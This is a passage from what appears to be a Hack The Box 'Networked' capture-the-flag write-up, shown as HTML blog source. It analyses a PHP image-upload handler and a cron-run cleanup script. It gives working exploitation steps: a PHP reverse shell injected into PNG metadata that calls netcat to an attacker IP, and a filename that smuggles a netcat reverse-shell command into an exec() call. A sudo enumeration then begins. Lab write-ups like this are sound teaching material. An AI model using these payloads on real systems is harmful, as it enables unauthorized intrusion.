  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'mime_content_type'</span><span class="p">))</span>
  <span class="p">{</span>
    <span class="nv">$file_type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$file_type</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// It's possible that mime_content_type() returns FALSE or an empty string</span>
    <span class="p">{</span>
      <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'type'</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">check_file_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nx">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$mime_type</span><span class="p">,</span> <span class="s1">'image/'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>  
<span class="p">}</span>

<span class="k">function</span> <span class="nf">displayform</span><span class="p">()</span> <span class="p">{</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"myFile"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"go!"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="cp">&lt;?php</span>
  <span class="k">exit</span><span class="p">();</span>
<span class="p">}</span>
<span class="cp">?&gt;</span></code></pre></figure>

<p>This file is a lot more interesting. This is obviously a “library” of functions, hence the name. Let’s checkout how they are being used in <code class="highlighter-rouge">upload.php</code>.</p>

<h4 id="uploadphp">upload.php</h4>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>

<span class="nb">define</span><span class="p">(</span><span class="s2">"UPLOAD_DIR"</span><span class="p">,</span> <span class="s2">"/var/www/html/uploads/"</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$myFile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">check_file_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'myFile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">60000</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s1">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span><span class="p">;</span>
      <span class="nx">displayform</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"&lt;p&gt;An error occurred.&lt;/p&gt;"</span><span class="p">;</span>
        <span class="nx">displayform</span><span class="p">();</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];</span>
    <span class="k">list</span> <span class="p">(</span><span class="nv">$foo</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">getnameUpload</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]);</span>
    <span class="nv">$validext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'.jpg'</span><span class="p">,</span> <span class="s1">'.png'</span><span class="p">,</span> <span class="s1">'.gif'</span><span class="p">,</span> <span class="s1">'.jpeg'</span><span class="p">);</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$validext</span> <span class="k">as</span> <span class="nv">$vext</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">substr_compare</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">],</span> <span class="nv">$vext</span><span class="p">,</span> <span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$vext</span><span class="p">))</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$valid</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"&lt;p&gt;Invalid image file&lt;/p&gt;"</span><span class="p">;</span>
      <span class="nx">displayform</span><span class="p">();</span>
      <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="s1">'_'</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">])</span><span class="o">.</span><span class="s1">'.'</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>

    <span class="nv">$success</span> <span class="o">=</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"&lt;p&gt;Unable to save file.&lt;/p&gt;"</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">"&lt;p&gt;file uploaded, refresh gallery&lt;/p&gt;"</span><span class="p">;</span>

    <span class="c1">// set proper permissions on the new file</span>
    <span class="nb">chmod</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="nx">displayform</span><span class="p">();</span>
<span class="p">}</span>
<span class="cp">?&gt;</span></code></pre></figure>

<p>Let’s try and decipher what’s going on.</p>

<p>I have added three parts together for clarity below.</p>

<p>First off we see that there is an <code class="highlighter-rouge">if()</code> statement to check the filetype using the function <code class="highlighter-rouge">check_file_type()</code>. Essentially the <code class="highlighter-rouge">if()</code> statement is saying “If the <code class="highlighter-rouge">check_file_type()</code> function returns <code class="highlighter-rouge">false</code>  display the upload form with an error message. Otherwise if the <code class="highlighter-rouge">check_file_type()</code> function returns <code class="highlighter-rouge">true</code> move on to the next statement”:</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">// if() statement in upload.php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">check_file_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'myFile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">60000</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s1">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span><span class="p">;</span>
  <span class="nx">displayform</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// check_file_type() function in lib.php</span>
<span class="k">function</span> <span class="nf">check_file_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nx">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$mime_type</span><span class="p">,</span> <span class="s1">'image/'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>  
<span class="p">}</span>

<span class="c1">// file_mime_type() function in lib.php</span>
<span class="k">function</span> <span class="nf">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'finfo_file'</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$finfo</span> <span class="o">=</span> <span class="nb">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">))</span> <span class="c1">// It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system</span>
    <span class="p">{</span>
      <span class="nv">$mime</span> <span class="o">=</span> <span class="o">@</span><span class="nb">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
      <span class="nb">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$mime</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$mime</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$file_type</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'mime_content_type'</span><span class="p">))</span>
  <span class="p">{</span>
    <span class="nv">$file_type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$file_type</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// It's possible that mime_content_type() returns FALSE or an empty string</span>
    <span class="p">{</span>
      <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'type'</span><span class="p">];</span>
<span class="p">}</span></code></pre></figure>

<p>Taking a look at the <code class="highlighter-rouge">check_file_type()</code> function in <code class="highlighter-rouge">lib.php</code> we see that the output of the <code class="highlighter-rouge">file_mime_type()</code> function is placed in to the variable <code class="highlighter-rouge">$mime_type</code>. The <code class="highlighter-rouge">file_mime_type()</code> function is quite self explanatory as it is getting the files mime type.</p>

<p>However, the important takeaway here is that it is actually “processing” the image to get the mime type so simply changing the file extension won’t work here.</p>

<p>The <code class="highlighter-rouge">$mime_type</code> variable is then checked to see if it contains the mime type <code class="highlighter-rouge">image/</code>. If it does then the output of the <code class="highlighter-rouge">check_file_type()</code> function will be <code class="highlighter-rouge">true</code> otherwise it will be <code class="highlighter-rouge">false</code>.</p>

<h2 id="foothold">Foothold</h2>

<p>From this information we can gather that our image needs to contain our payload.</p>

<p>Download one of the <code class="highlighter-rouge">.png</code> images from <code class="highlighter-rouge">http://networked.htb/photos.php</code> and save as <code class="highlighter-rouge">payload.png</code>. We will then use <code class="highlighter-rouge">exiftool</code> to inject <em>PHP</em> code in to the image metadata input of <code class="highlighter-rouge">Document Name</code> like so:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">exiftool <span class="nt">-DocumentName</span><span class="o">=</span><span class="s2">"&lt;?php shell_exec('nc &lt;attacker-ip&gt; 1337 -e /bin/bash'); __halt_compiler();?&gt;&lt;/h1&gt;"</span> payload.png</code></pre></figure>

<p>Be sure to change <code class="highlighter-rouge">&lt;attacker-ip&gt;</code>.</p>

<p>Then we will rename our file adding <code class="highlighter-rouge">.php</code> like so: <code class="highlighter-rouge">payload.php.png</code>.</p>

<p>We then setup our <em>Netcat</em> listener on our attacker machine:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lvp</span> 1337</code></pre></figure>

<p>Now let’s try uploading the file to the server and executing it by navigating to <code class="highlighter-rouge">http://networked.htb/photos.php</code>.</p>

<p>Back at our listener we should see a connection:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:41616.
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span></code></pre></figure>

<p>From here we can <a href="/writeups/pentesting-cheatsheets/privilege-escalation/linux/#upgrade-shell">upgrade our shell</a> if we wish.</p>

<p>As we can see we are the user <code class="highlighter-rouge">apache</code> and if we use the command <code class="highlighter-rouge">pwd</code> our current working directory is <code class="highlighter-rouge">/var/www/html/uploads</code>. If we go to our <code class="highlighter-rouge">home</code> folder with the command <code class="highlighter-rouge">cd ~</code> we see that our home directory path is <code class="highlighter-rouge">/usr/share/httpd</code>. If we check this location with <code class="highlighter-rouge">ls -l</code> we see that there is no <code class="highlighter-rouge">user.txt</code> file.</p>

<p>Having a look at the <code class="highlighter-rouge">/home</code> directory we see the user <code class="highlighter-rouge">guly</code>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> <span class="nt">-l</span> /home
drwxr-xr-x. 2 guly guly 159 Jul  9  2019 guly</code></pre></figure>

<p>We will most likely need to gain access to this account.</p>

<h3 id="information-leak-1">Information Leak</h3>

<p>Taking note of the <code class="highlighter-rouge">guly</code> directory permissions we see that we should be able to view the contents.</p>

<p>Let’s take a peek:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> <span class="nt">-l</span> /home/guly/
total 12
<span class="nt">-r--r--r--</span><span class="nb">.</span> 1 root root 782 Oct 30  2018 check_attack.php
<span class="nt">-rw-r--r--</span>  1 root root  44 Oct 30  2018 crontab.guly
<span class="nt">-r--------</span><span class="nb">.</span> 1 guly guly  33 Oct 30  2018 user.txt</code></pre></figure>

<p>Here we see three files one of which is our <code class="highlighter-rouge">user.txt</code> ready to be taken.</p>

<h4 id="check_attackphp">check_attack.php</h4>

<p>Let’s have a look at the contents of <code class="highlighter-rouge">check_attack.php</code>:</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>                                                                                                                                                                                       
<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>                                                                                                                                                            
<span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/uploads/'</span><span class="p">;</span>
<span class="nv">$logpath</span> <span class="o">=</span> <span class="s1">'/tmp/attack.log'</span><span class="p">;</span>
<span class="nv">$to</span> <span class="o">=</span> <span class="s1">'guly'</span><span class="p">;</span>
<span class="nv">$msg</span><span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$headers</span> <span class="o">=</span> <span class="s2">"X-Mailer: check_attack.php</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>

<span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$files</span> <span class="o">=</span> <span class="nb">preg_grep</span><span class="p">(</span><span class="s1">'/^([^.])/'</span><span class="p">,</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$msg</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="s1">'index.html'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">continue</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">#echo "-------------\n";</span>

  <span class="c1">#print "check: $value\n";</span>
  <span class="k">list</span> <span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">getnameCheck</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
  <span class="nv">$check</span> <span class="o">=</span> <span class="nx">check_ip</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"attack!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="c1"># todo: attach file</span>
    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logpath</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nx">FILE_APPEND</span> <span class="o">|</span> <span class="nx">LOCK_EX</span><span class="p">);</span>

    <span class="nb">exec</span><span class="p">(</span><span class="s2">"rm -f </span><span class="nv">$logpath</span><span class="s2">"</span><span class="p">);</span>
    <span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"rm -f </span><span class="nv">$path$value</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="s2">"-F</span><span class="nv">$value</span><span class="s2">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span></code></pre></figure>

<p>Simplistically the script is creating a list of filenames from the <code class="highlighter-rouge">uploads</code> directory and seeing if the names have the IP address like we saw in the photo gallery earlier. If this check fails the script deletes the file.</p>

<p>Taking a look at this check we see something interesting:</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">"attack!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
  <span class="c1"># todo: attach file</span>
  <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logpath</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nx">FILE_APPEND</span> <span class="o">|</span> <span class="nx">LOCK_EX</span><span class="p">);</span>

  <span class="nb">exec</span><span class="p">(</span><span class="s2">"rm -f </span><span class="nv">$logpath</span><span class="s2">"</span><span class="p">);</span>
  <span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span>
  <span class="k">echo</span> <span class="s2">"rm -f </span><span class="nv">$path$value</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
  <span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="s2">"-F</span><span class="nv">$value</span><span class="s2">"</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>The script is using the <em>PHP</em> <code class="highlighter-rouge">exec()</code> function to delete the file using the <code class="highlighter-rouge">rm</code> command:</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span></code></pre></figure>

<p>The interesting thing about this is the <code class="highlighter-rouge">$value</code> variable which would be the filename.</p>

<p>Thinking about how the Linux commandline works we should be able to attach our own command like so: <code class="highlighter-rouge">;&lt;command&gt;</code></p>

<h4 id="crontabguly">crontab.guly</h4>

<p>Taking a quick look at <code class="highlighter-rouge">crontab.guly</code> we see that <code class="highlighter-rouge">check_attack.php</code> is run at every 3rd minute:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">*</span>/3 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> php /home/guly/check_attack.php</code></pre></figure>

<h2 id="user">User</h2>

<p>Now that we have found our exploit let’s try it out.</p>

<p>Once again let’s setup our <em>Netcat</em> listener:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lvp</span> 1234</code></pre></figure>

<p>And then create our file/command ensuring we are at the path <code class="highlighter-rouge">/var/www/html/uploads</code>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">touch</span> <span class="s2">";nohup nc &lt;attacker-ip&gt; 1234 -c sh &amp;"</span></code></pre></figure>

<p>After a few minutes we should receive a connection:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:39574.
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>guly<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>guly<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>guly<span class="o">)</span>
<span class="nb">cat </span>user.txt 
526cfc2305....12c57d71c5</code></pre></figure>

<p>We have our <code class="highlighter-rouge">user.txt</code> flag! Once again we can <a href="/writeups/pentesting-cheatsheets/privilege-escalation/linux/#upgrade-shell">upgrade our shell</a> if we wish. Now on to <code class="highlighter-rouge">root</code>.</p>

<h2 id="root">Root</h2>

<p>First things first. Let’s check to see if we have any <code class="highlighter-rouge">sudo</code> rights:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>guly on networked:
    <span class="o">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"</span>,
    env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>,
    env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>,
    env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>,
    env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>,
    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin

User guly may run the following commands on networked:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/sbin/changename.sh</code></pre></figure>

<p>Ok so we can use <code class="highlighter-rouge">sudo</code> with the script <code class="highlighter-rouge">changename.sh</code>.</p>

<p>Let’s check it out:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> /usr/local/sbin/changename.sh
<span class="c">#!/bin/bash -p</span>
<span class="nb">cat</span> <span class="o">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class="o">&lt;&lt;</span> <span class="no">EoF</span><span class="sh">
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
</span><span class="no">EoF

</span><span class="nv">regexp</span><span class="o">=</span><span class="s2">"^[a-zA-Z0-9_</span><span class="se">\ </span><span class="s2">/-]+$"</span>

<span class="k">for </span>var <span class="k">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class="p">;</span> <span class="k">do
        </span><span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
        <span class="nb">read </span>x
        <span class="k">while</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$x</span> <span class="o">=</span>~ <span class="nv">$regexp</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do
                </span><span class="nb">echo</span> <span class="s2">"wrong input, try again"</span>
                <span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
                <span class="nb">read </span>x
        <span class="k">done
        </span><span class="nb">echo</span> <span class="nv">$var</span><span class="o">=</span><span class="nv">$x</span> <span class="o">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly
<span class="k">done</span>
  
/sbin/ifup guly0</code></pre></figure>

<p>From taking a look at this script we see that when it is run we are asked for some inputs. The inputs we enter are then added to <code class="highlighter-rouge">/etc/sysconfig/network-scripts/ifcfg-guly</code>.</p>

<p>Let’s run the script to confirm this is the case entering in random inputs:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> /usr/local/sbin/changename.sh
interface NAME:
s
interface PROXY_METHOD:
a
interface BROWSER_ONLY:
b
interface BOOTPROTO:
e
ERROR     : <span class="o">[</span>/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.</code></pre></figure>

<p>And then check to see if our inputs are in <code class="highlighter-rouge">ifcfg-guly</code>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> /etc/sysconfig/network-scripts/ifcfg-guly
<span class="nv">DEVICE</span><span class="o">=</span>guly0
<span class="nv">ONBOOT</span><span class="o">=</span>no
<span class="nv">NM_CONTROLLED</span><span class="o">=</span>no
<span class="nv">NAME</span><span class="o">=</span>s
<span class="nv">PROXY_METHOD</span><span class="o">=</span>a
<span class="nv">BROWSER_ONLY</span><span class="o">=</span>b
<span class="nv">BOOTPROTO</span><span class="o">=</span>e</code></pre></figure>

<p>So far so good. Let’s check our operating system so we can search for some vulnerabilities relating to <code class="highlighter-rouge">ifcfg</code>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> /etc/<span class="k">*</span><span class="nt">-release</span>
CentOS Linux release 7.6.1810 <span class="o">(</span>Core<span class="o">)</span> 
<span class="nv">NAME</span><span class="o">=</span><span class="s2">"CentOS Linux"</span>
